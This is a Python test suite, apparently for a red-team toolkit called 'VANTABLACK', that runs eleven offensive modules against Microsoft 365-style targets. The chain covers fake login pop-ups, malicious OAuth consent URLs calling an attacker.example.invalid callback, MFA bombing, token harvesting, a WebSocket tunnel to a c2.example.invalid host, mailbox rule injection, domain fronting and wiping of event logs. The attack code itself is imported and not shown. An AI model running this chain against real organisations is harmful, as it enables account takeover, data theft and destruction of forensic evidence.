"""
Test unifié - Toutes les techniques offensives du Red Team
==========================================================

Exécute chaque module d'attaque end-to-end et vérifie qu'il produit
un artefact exploitable. Couvre :
  1. BitB
  2. OAuth Consent
  3. Device Code
  4. MFA Bombing
  5. Token Harvester
  6. Service Worker persistence
  7. Automated flow
  8. WebSocket smuggling
  9. Mailbox pivot
 10. Domain fronting
 11. Anti-forensics wipe

Usage:
  python test_attacks_all.py
"""

import asyncio
import sys
import time
from pathlib import Path

# Make the project root importable
ROOT = Path(__file__).parent
sys.path.insert(0, str(ROOT))


def banner(text: str) -> None:
    print()
    print("=" * 78)
    print(f"  {text}")
    print("=" * 78)


def result(name: str, ok: bool, detail: str = "") -> None:
    mark = "PASS" if ok else "FAIL"
    print(f"  [{mark}] {name}  {detail}")


def test_bitb() -> bool:
    banner("[1/11] BitB - Browser-in-the-Browser")
    from fastapi import FastAPI

    from attack.bitb import BitBInjector, BitBTarget, register_bitb_routes
    app = FastAPI()
    register_bitb_routes(app)
    injector = BitBInjector(target=BitBTarget.MICROSOFT)
    html = injector.generate_popup_html("https://login.microsoftonline.com",
                                        parent_origin="https://outlook.office.com")
    ok = len(html) > 1000 and "Microsoft" in html
    result("BitB", ok, f"html_length={len(html)}")
    return ok


def test_oauth_consent() -> bool:
    banner("[2/11] OAuth Consent Grant")
    from attack.oauth_consent import MaliciousApp, generate_attack_url, mint_token_from_code
    url = generate_attack_url(
        MaliciousApp.SHAREPOINT_ANALYTICS,
        victim_email="ceo@entreprise.local",
        redirect_uri="https://attacker.example.invalid/callback",
    )
    ok = "login.microsoftonline.com" in url and "Mail.Read" in url
    result("OAuth Consent URL", ok, f"url_ok={ok}")
    return ok


def test_device_code() -> bool:
    banner("[3/11] Device Code Phishing")
    from attack.device_code import DeviceCodeInitiator
    init = DeviceCodeInitiator(client_id="11111111-1111-1111-1111-111111111111")
    flow = init.request_device_code(["User.Read", "Mail.Read"])
    ok = bool(flow.user_code) and len(flow.user_code) >= 6
    result("Device Code", ok, f"user_code={flow.user_code}")
    return ok


def test_mfa_bombing() -> bool:
    banner("[4/11] MFA Bombing (async)")
    async def runner():
        from attack.mfa_bombing import MFABombingEngine, MFATarget
        eng = MFABombingEngine()
        c = eng.start_campaign(
            target=MFATarget.MICROSOFT_ENTRA,
            username="victim@entreprise.local",
            interval_seconds=0.1,  # accéléré pour test
            max_attempts=3,
            auto_accept_callback=lambda a: a.attempt_id and True,  # simule accept
        )
        # wait until accepted
        for _ in range(20):
            await asyncio.sleep(0.2)
            if c.accepted_attempt:
                break
        await eng.stop_campaign(c.campaign_id)
        return c.accepted_attempt is not None
    ok = asyncio.run(runner())
    result("MFA Bombing", ok, "campaign accepted" if ok else "no accept")
    return ok


def test_token_harvester() -> bool:
    banner("[5/11] Token Harvester")
    from attack.token_harvester import TokenHarvester
    eng = TokenHarvester()
    n = eng.harvest_all("victim-pc")
    ok = n >= 10
    result("Token Harvester", ok, f"tokens_harvested={n}")
    return ok


def test_sw_persistence() -> bool:
    banner("[6/11] Service Worker persistence")
    from attack.sw_persistence import ServiceWorkerExploit
    eng = ServiceWorkerExploit()
    c = eng.build_campaign(
        attacker_domain="cdn.legit-corp.example",
        target_origin="https://shop.example.com",
    )
    eng.simulate_install(c.campaign_id)
    eng.simulate_intercept(c.campaign_id, 5)
    ok = c.installed and c.intercept_count == 5
    result("Service Worker", ok, f"installed={c.installed} intercepts={c.intercept_count}")
    return ok


def test_automated_flow() -> bool:
    banner("[7/11] Automated AiTM flow (async)")
    from attack.automated_flow import AttackStep, AutomatedAiTMFlow, FlowConfig
    async def runner():
        eng = AutomatedAiTMFlow()
        cfg = FlowConfig(
            target_email="cfo@entreprise.local",
            steps=[
                AttackStep.SEND_PHISH,
                AttackStep.BITB_INJECT,
                AttackStep.MFA_BOMBING,
                AttackStep.CAPTURE_SESSION,
                AttackStep.REPLAY_COOKIE,
            ],
        )
        r = await eng.run(cfg)
        return r
    r = asyncio.run(runner())
    ok = r.get("success", False) and r.get("artifacts", {}).get("capture_session") is not None
    result("Automated flow", ok, f"success={r.get('success')}")
    return ok


def test_ws_smuggling() -> bool:
    banner("[8/11] WebSocket smuggling")
    async def runner():
        from attack.ws_smuggling import WSSmugglingTunnel
        eng = WSSmugglingTunnel()
        cfg = eng.create_tunnel("wss://c2.example.invalid/ws", "graphql-ws")
        await eng.send_command(cfg.tunnel_id, "whoami", {})
        await eng.receive_response(
            cfg.tunnel_id,
            eng.encode_payload(b'{"out":"victim\\nvictim@entreprise.local"}'),
        )
        return cfg.bytes_sent > 0
    ok = asyncio.run(runner())
    result("WS Smuggling", ok, "tunnel_ok")
    return ok


def test_mailbox_pivot() -> bool:
    banner("[9/11] Mailbox pivot")
    from attack.mailbox_pivot import MailboxPivot, RuleAction
    eng = MailboxPivot()
    rules = eng.plan_rules("ceo@entreprise.local")
    eng.inject("ceo@entreprise.local", rules)
    summary = eng.impact_summary("ceo@entreprise.local")
    ok = summary["n_rules"] >= 3
    result("Mailbox pivot", ok, f"rules_injected={summary['n_rules']}")
    return ok


def test_domain_fronting() -> bool:
    banner("[10/11] Domain fronting")
    from attack.domain_fronting import CDNProvider, FrontingRouter
    eng = FrontingRouter()
    cfg = eng.create_config(
        cdn=CDNProvider.CLOUDFRONT,
        front_domain="media.legit-corp.com",
        real_host_header="c2.attacker.example.invalid",
    )
    tf = eng.export_terraform(cfg)
    ok = "aws_cloudfront_distribution" in tf
    result("Domain fronting", ok, f"tf_lines={len(tf.splitlines())}")
    return ok


def test_anti_forensics() -> bool:
    banner("[11/11] Anti-forensics wipe")
    async def runner():
        from attack.anti_forensics import AntiForensicsWiper, WipeTarget
        eng = AntiForensicsWiper()
        op = eng.plan_wipe([
            WipeTarget.WINDOWS_EVENTLOG,
            WipeTarget.POWERSHELL_HISTORY,
            WipeTarget.PREFETCH,
            WipeTarget.BROWSER_HISTORY,
        ])
        op = await eng.execute_wipe(op)
        return op.success and op.bytes_wiped > 0
    ok = asyncio.run(runner())
    result("Anti-forensics", ok, "wipe_done")
    return ok


def main() -> int:
    print("VANTABLACK - Unified Red Team Attack Test Suite")
    print("=" * 78)
    start = time.time()
    tests = [
        test_bitb,
        test_oauth_consent,
        test_device_code,
        test_mfa_bombing,
        test_token_harvester,
        test_sw_persistence,
        test_automated_flow,
        test_ws_smuggling,
        test_mailbox_pivot,
        test_domain_fronting,
        test_anti_forensics,
    ]
    results = []
    for t in tests:
        try:
            results.append((t.__name__, t()))
        except Exception as e:
            print(f"  [ERR] {t.__name__}: {e}")
            results.append((t.__name__, False))
    elapsed = time.time() - start
    passed = sum(1 for _, ok in results if ok)
    total = len(results)
    print()
    print("=" * 78)
    print(f"  RESULT: {passed}/{total} techniques passed in {elapsed:.2f}s")
    print("=" * 78)
    for name, ok in results:
        mark = "PASS" if ok else "FAIL"
        print(f"   [{mark}] {name}")
    return 0 if passed == total else 1


if __name__ == "__main__":
    sys.exit(main())
